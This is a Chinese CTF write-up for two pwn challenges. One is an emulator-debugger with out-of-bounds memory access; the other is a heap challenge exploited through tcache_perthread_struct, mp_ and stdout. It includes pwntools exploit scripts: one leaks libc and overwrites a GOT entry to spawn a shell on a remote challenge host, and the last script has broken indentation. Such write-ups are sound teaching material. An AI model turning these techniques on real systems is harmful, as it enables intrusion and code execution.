# PWN -> nemu(调试器、下标越界)
题目是⼀个模拟器和调试器，需要了解他的整体架构。题目附赠源码。
## 漏洞点
在调试器的set命令存在越界写，x指令存在越界读，如下：
```c
// ui.c
static int cmd_x(char *args){
    if(args == NULL){printf("Please input argument\n"); return 0;}
    else{
        printf("%-10s\t%-10s\t%-10s\n","Address","DwordBlock","DwordBlock");
        char *n_str = strtok(args, " ");
        if(!memcmp(n_str,"0x",2)){
           long addr = strtol(n_str,NULL,16);
           printf("%#010x\t",(uint32_t)addr);
           printf("%#010x\n",vaddr_read(addr,4)); 
        }
        else{
            int n = atoi(n_str);
            n_str = strtok(NULL, " ");
            long addr = strtol(n_str,NULL, 16);
            while(n){
                printf("%#010x\t",(uint32_t)addr);
                for(int i=1; i<=2; i++){
                    printf("%#010x\t",vaddr_read(addr,4));      <---------point>
                    addr += 4;
                    n--;
                    if(n == 0) break;
                }
                printf("\n");
            }
        }
    }
    return 0;
}

extern uint32_t expr(char *e, bool *success);

static int cmd_p(char *args){
    if(args == NULL){printf("Please input argument\n"); return 0;}
    else{
        bool success = false;
        uint32_t result = expr(args, &success);
        if(!success){
            printf("Wrong express!\n");
            return 0;
        }
        else{
            printf("%#x\n",result);
        }
    }
    return 0;

}

static int cmd_set(char *args){
  paddr_t dest_addr;
  uint32_t data;
  bool success = false;


  if(args == NULL) {
    printf("Please input argument\n");
    return 0;
  }
  else{
    //split string
    char *dest_addr_str = strtok(args, " ");
    char *data_str = strtok(NULL, " ");
    if( (dest_addr_str==NULL) || (data_str == NULL)){
      printf("wrong argument\n");
      return 0;
    }
    dest_addr = expr(dest_addr_str, &success);
    if(!success) {
      printf("Wrong express!\n");
      return 0;
    }
    data = expr(data_str, &success);
    if(!success) {
      printf("Wrong express!\n");
      return 0;
    }
    vaddr_write(dest_addr, 4, data);  <----------point>
    return 0;
  }
}
```
```c
// memory.h
#ifndef __MEMORY_H__
#define __MEMORY_H__

#include "common.h"

extern uint8_t pmem[];

/* convert the guest physical address in the guest program to host virtual address in NEMU */
#define guest_to_host(p) ((void *)(pmem + (unsigned)p))                               <---------越界>
/* convert the host virtual address in NEMU to guest physical address in the guest program */
#define host_to_guest(p) ((paddr_t)((void *)p - (void *)pmem))                        <---------越界>

uint32_t vaddr_read(vaddr_t, int);
uint32_t paddr_read(paddr_t, int);
void vaddr_write(vaddr_t, int, uint32_t);
void paddr_write(paddr_t, int, uint32_t);

#endif

```

```c
// memory.c
#include "nemu.h"

#define PMEM_SIZE (128 * 1024 * 1024)

#define pmem_rw(addr, type) *(type *)({\
    guest_to_host(addr); \
    })

uint8_t pmem[PMEM_SIZE] = {0};

/* Memory accessing interfaces */

uint32_t paddr_read(paddr_t addr, int len) {
  return pmem_rw(addr, uint32_t) & (~0u >> ((4 - len) << 3));
}

void paddr_write(paddr_t addr, int len, uint32_t data) {
  memcpy(guest_to_host(addr), &data, len);
}

uint32_t vaddr_read(vaddr_t addr, int len) {      <---------越界读>
  return paddr_read(addr, len);
}

void vaddr_write(vaddr_t addr, int len, uint32_t data) {           <-----------越界写>
  paddr_write(addr, len, data);
}

```
首先我们下一个断点，让head不为空，然后修改head为got表上方的一个地址，之后利用info函数可以在打印old_value的时候将got表里的值打印出来，从而泄露libc
泄露libc之后，再次修改head为strcmp的got表地址，然后利用w指令将system写进去，最后输入一个/bin/sh就可以getshell了
## exp
```python
from re import L
from pwn import *
from ctypes import *
from string import *
from hashlib import *
from itertools import product
context.log_level = 'debug'
context.arch='amd64'
#io = process('./pwn',aslr=True)
io = remote('101.43.61.60',9130)
libc = ELF('./libc-2.23.so')
elf=ELF("./pwn")
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
irt = lambda            : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
# lg = lambda s,addr        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
def setmem(offset, value):
    ru("(nemu) ")
    sl("set {offset} {value}".format(offset=hex(offset-0x6a3b80), value=hex(value)))
def setw(addr):
    ru("(nemu) ")
    sl("w {addr}".format(addr=hex(addr)))
head=0x86a3fc8
cmp_got=elf.got['strcmp']
sla("(nemu) ",'w $eax')
setmem(head,0x60efd8)
sla("(nemu) ",'info w')
io.recvuntil("0x") 
libcbase = int(io.recv(8),16)
io.recvuntil("0x") 
libcbase = (int(io.recv(4), 16) << 32) + libcbase-0x837168
lg("libcbase")
system=libcbase+libc.sym['system']
setmem(head,cmp_got-0x30)
setw(system&0xffffffff)
sla("(nemu) ",'/bin/sh')
#gdb.attach(io)
irt()

```
## refer

[南航nemu项目](https://github.com/NJU-ProjectN/nemu)

[nemu题解]https://blog.csdn.net/weixin_46483787/article/details/123215057

# unbelievable_write(一次任意free、tcache_perthread_struct、复写malloc_par结构、stdout任意地址写)
题目逻辑简单，但是特殊的地方是在malloc写入数据后直接就把申请的chunk给free掉了，需要将bss段的变量值改变从而输出flag。
难点在于唯⼀的malloc必须⽴刻free，⽽free的检查⾮常的严格，故普通的任意地址写到target变量，这将⽆ 法通过free的检查，程序崩溃。
## 分析
题目开启的保护有
```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
可以改写got表。没开pie
程序可以释放堆上任意指针一次：
```c
void c2()
{
  __int64 v0; // rbx
  int v1; // eax

  if ( golden == 1 )
  {
    golden = 0LL;
    v0 = ptr;
    v1 = read_int();
    free((void *)(v0 + v1)); <------free any>
  }
  else
  {
    puts("no!");
  }
}
```
下面是malloc后，read，直接free。
```c
void c1()
{
  unsigned int size; // [rsp+4h] [rbp-Ch]
  void *size_4; // [rsp+8h] [rbp-8h]

  size = read_int();
  if ( size <= 0xF || size > 0x1000 )
  {
    puts("no!");
  }
  else
  {
    size_4 = malloc(size);    
    readline(size_4, size);
    free(size_4);
  }
}
```
还有一个backdoor输出flag。
```c
unsigned __int64 c3()
{
  int fd; // [rsp+Ch] [rbp-54h]
  char buf[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( target != 0xFEDCBA9876543210LL )
  {
    puts("you did it!");
    fd = open("./flag", 0, 0LL);
    read(fd, buf, 0x40uLL);
    puts(buf);
    exit(0);
  }
  puts("no write! try again?");
  return __readfsqword(0x28u) ^ v3;
}
```

## 利用方法

## 方法一(非预期)

1. 利用任意堆地址free可以将tcache_prthread_struct 释放掉，进而布局tcache链表
2. 在链表上布局target、freegot地址
3. 利用c1功能将freegot改为putsgot从而绕过free检查，再将target申请出来改为目标值
4. 调用c3功能获取flag

## 方式(官方)
```c
struct malloc_par
{
  /* Tunable parameters */
  unsigned long trim_threshold;
  INTERNAL_SIZE_T top_pad;
  INTERNAL_SIZE_T mmap_threshold;
  INTERNAL_SIZE_T arena_test;
  INTERNAL_SIZE_T arena_max;

#if HAVE_TUNABLES
  /* Transparent Large Page support.  */
  INTERNAL_SIZE_T thp_pagesize;
  /* A value different than 0 means to align mmap allocation to hp_pagesize
     add hp_flags on flags.  */
  INTERNAL_SIZE_T hp_pagesize;
  int hp_flags;
#endif

  /* Memory map support */
  int n_mmaps;
  int n_mmaps_max;
  int max_n_mmaps;
  /* the mmap_threshold is dynamic, until the user sets
     it manually, at which point we need to disable any
     dynamic behavior. */
  int no_dyn_threshold;

  /* Statistics */
  INTERNAL_SIZE_T mmapped_mem;
  INTERNAL_SIZE_T max_mmapped_mem;

  /* First address handed out by MORECORE/sbrk.  */
  char *sbrk_base;

#if USE_TCACHE
  /* Maximum number of buckets to use.  */
  size_t tcache_bins;
  size_t tcache_max_bytes;
  /* Maximum number of chunks in each bucket.  */
  size_t tcache_count;
  /* Maximum number of chunks to remove from the unsorted list, which
     aren't used to prefill the cache.  */
  size_t tcache_unsorted_limit;
#endif
};
```
```c
pwndbg> p mp_
$1 = {
  trim_threshold = 131072,
  top_pad = 131072,
  mmap_threshold = 131072,
  arena_test = 8,
  arena_max = 0,
  n_mmaps = 0,
  n_mmaps_max = 65536,
  max_n_mmaps = 0,
  no_dyn_threshold = 0,
  mmapped_mem = 0,
  max_mmapped_mem = 0,
  sbrk_base = 0x405000 "",
  tcache_bins = 64,              <--------maxbins>
  tcache_max_bytes = 1032,
  tcache_count = 7,
  tcache_unsorted_limit = 0
}

```
malloc_par结构体记录着tcache最大bin数量，将tcache_bins字段覆盖成大数，使得0x1000大小的chunk(里面填充了target地址，使得在puts第一次初始化的时候会将stdout结构体填充成target地址，在后面会在target处写入输出的内容)在tcache里，绕过free的检测。其中需要爆破mp地址的4bit大小

利用io的思路：
1. 利⽤⼀次任意地址free, free tcache perthread的chunk. 
2. 修改mp_中配置最⼤tcache的数量。半字节爆破(1/16概率)，malloc到mp_+16的位置。这样0x1000⼤⼩的 chunk也在tcache中，并且能通过free的检查。 
3. 利⽤stdout完成任意地址写。题⽬没进⾏stdio初始化，故在第⼀次puts()时，stdout才会申请buffer，并在 申请的buffer中写⼊输出的字符串内容，完成任意地址写。
4. 触发后门

## 总结

此利用方法需要能修改tcache_perthread_struct，程序第一次使用puts等stdout相关函数，可以通过puts实现一次任意地址写（实际是利用stdout进行任意地址写），特点是malloc后立即free，需要绕过free的检查。

## exp
方式一：
```python
 #coding:utf8
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
sh = process('./pwn')
# sh = remote('119.23.255.127',34212)
elf = ELF('./pwn')

def add(size,content):
   sh.sendlineafter('>','1')
   sh.sendline(str(size))
   sh.send(content)

def delete(index):
   sh.sendlineafter('>','2')
   sh.sendline(str(index))

def backdoor():
   sh.sendlineafter('>','3')


target = 0x404080
free_got = elf.got['free']
puts_plt = 0x401040
delete(-0x290)
payload = '\x01'*0x50 + p8(1)*0x10
payload = payload.ljust(0x100,'\x00')
payload += p64(target-0x10)
payload += p64(free_got)
payload = payload.ljust(0x280,'\x00')
add(0x280,payload)
gdb.attach(sh)


payload2 = p64(puts_plt) + p64(puts_plt)[0:6]
#修改free got为puts_plt
add(0x120,payload2 + '\n')

#raw_input()
add(0x110,p64(0)*2 + p64(0x6666) + '\n')
backdoor()

sh.interactive()
```
方式二：参考官方WP

```python
#!/usr/bin/env python3 
from pwn import * 
context(os='linux', arch='amd64') 
#context.log_level='debug' 
def exp(): 
    io = process('./pwn', stdout=PIPE) 
    # io = remote('172.17.0.1', 9999) 
    def malloc(size, content): 
        io.sendlineafter(b'>', b'1') 
        io.sendline(str(int(size)).encode()) 
        io.send(content) 
    def tcache_count(l): 
        res = [b'\x00\x00' for i in range(64)] 
            for t in l: 
                res[(t - 0x20)//0x10] = b'\x08\x00' 
            return b''.join(res)
    try:
        malloc(0x1000, p64(0x404078)*(0x1000//8)) #填充target地址，free后合并进入topchunk
        io.sendlineafter(b'>', b'2') 
        io.sendline(b'-656') # free tcache_perthread_struct
        malloc(0x280, tcache_count([0x290]) + b'\n')   # 将tcache[0x290]填满，让tcache_perthread_struct可以free到unsortedbin，malloc tcache_perthread_struct and free,free to unsortedbin
        malloc(0x260, tcache_count([0x270]) + b'\n')   # 将tcache[0x270]填满，从unsortedbin申请 Leave libc address in tcache[0x400]
        malloc(0x280, tcache_count([0x400, 0x410, 0x290] ) + b'\x01\x00'*4*62 + b'\x90\xf2' + b'\n') # Modify the last 2 bytes of libc to mp_offset
        malloc(0x3f0, flat([ 0x20000, 0x8, 0,0x10000, 0, 0, 0, 0x1301000, 2**64-1, ]) + b'\n') # malloc mp_ and rewrite tcachebins to a bignumber
        io.sendlineafter(b'>', b'3') # The first initialization of puts will apply for memory and write the output content to the buffer (target)
        io.sendlineafter(b'>', b'3') # trigger
        flaaag = io.recvall(timeout=2) 
        print(flaaag) io.close() 
        return True 
    except: 
        io.close() 
        return False 
i = 0 
while i < 20 and not exp(): 
    i += 1 
    continue
```
## 总结
感觉后面可以将出题人的思路延伸。